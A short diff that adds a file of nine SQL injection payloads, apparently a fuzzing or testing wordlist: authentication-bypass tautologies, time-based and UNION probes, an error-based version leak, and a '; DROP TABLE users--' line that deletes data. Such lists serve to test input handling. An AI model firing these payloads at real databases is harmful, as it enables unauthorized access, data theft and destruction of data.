@@ -1,0 +1,9 @@
+'
+' OR '1'='1
+' OR 1=1--
+1' AND '1'='1
+1' AND SLEEP(5)--
+' UNION SELECT NULL--
+' AND 1=CONVERT(int, @@version)--
+'; DROP TABLE users--
+' OR 1=1 #
